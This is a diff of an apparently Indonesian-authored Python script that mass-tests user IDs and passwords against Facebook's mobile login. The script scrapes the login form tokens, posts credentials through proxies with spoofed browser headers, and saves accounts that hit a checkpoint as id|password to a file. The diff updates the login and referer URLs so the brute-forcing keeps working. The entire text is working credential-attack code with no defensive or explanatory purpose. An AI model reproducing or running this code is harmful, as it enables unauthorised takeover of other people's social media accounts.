@@ -1345,12 +1345,11 @@ def mobile_v2(uiz,pwr,link_okep):
 				"sec-fetch-user": "?1",
 				"upgrade-insecure-requests": "1",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			p = ses.get(f"https://{link_okep}/login/device-based/login/async/?refsrc=deprecated&amp",headers=headers1)
+			p = ses.get(f"https://{link_okep}/login.php?next=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F1501092823525282%2F%3Fplcdp%3Dtouch%26next%3Dhttps%253A%252F%252Fm.facebook.com%252Fv3.2%252Fdialog%252Foauth%253Fencrypted_query_string%253DAeDDCZdtv-eJpWttVol6HpUqPDiBFObfZHQVfouU8RiXclZLtvfDd4ShZAKcxhjJnp0xHqIzpS8MkZaXcRqtWGPgH5R-4FcVdm4QevoWTKrTNkQ9tNeYn1P_rJSdXKxRBiutS4ILGMKqLCvx5qPQFNHtc4yDlJA3zIXEUPb3702QZ-7xbcjjypAl-rwA3XM8oZQAfe5XtQzHePJvG_gaJpIpLXGNHvFAQNg1-gk4UKCJCZGeAQaxVLW6GwzxV3aA87ja7hwRN23ewg%2526plcdp%253Dtouch%26paipv%3D0%26eav%3DAfZNf8cIwfegNWdknVJDKsw36UukMeLUO6JtPpfMz1v-M11B4TSKQyuUBc06hLupUOU&refsrc=deprecated&_rdr",headers=headers1)
 			data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
 				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
 				"uid":uiz,
-				"next":f"https://{link_okep}/login/device-based/login/async/?refsrc=deprecated&amp",
 				"pass":pw,
 				"flow":"login_no_pin"}
 			kuko = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
@@ -1374,10 +1373,10 @@ def mobile_v2(uiz,pwr,link_okep):
 				"sec-fetch-dest": "empty",
 				"sec-fetch-user": "?1",
 				"upgrade-insecure-requests": "1",
-				"referer": f"https://{link_okep}/login/device-based/login/async/?refsrc=deprecated&amp",
+				"referer": f"https://{link_okep}/login.php?next=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F1501092823525282%2F%3Fplcdp%3Dtouch%26next%3Dhttps%253A%252F%252Fm.facebook.com%252Fv3.2%252Fdialog%252Foauth%253Fencrypted_query_string%253DAeDDCZdtv-eJpWttVol6HpUqPDiBFObfZHQVfouU8RiXclZLtvfDd4ShZAKcxhjJnp0xHqIzpS8MkZaXcRqtWGPgH5R-4FcVdm4QevoWTKrTNkQ9tNeYn1P_rJSdXKxRBiutS4ILGMKqLCvx5qPQFNHtc4yDlJA3zIXEUPb3702QZ-7xbcjjypAl-rwA3XM8oZQAfe5XtQzHePJvG_gaJpIpLXGNHvFAQNg1-gk4UKCJCZGeAQaxVLW6GwzxV3aA87ja7hwRN23ewg%2526plcdp%253Dtouch%26paipv%3D0%26eav%3DAfZNf8cIwfegNWdknVJDKsw36UukMeLUO6JtPpfMz1v-M11B4TSKQyuUBc06hLupUOU&refsrc=deprecated&_rdr",
 				"accept-encoding": "gzip, deflate br",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			po = ses.post(f"https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
+			po = ses.post(f"https://{link_okep}/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
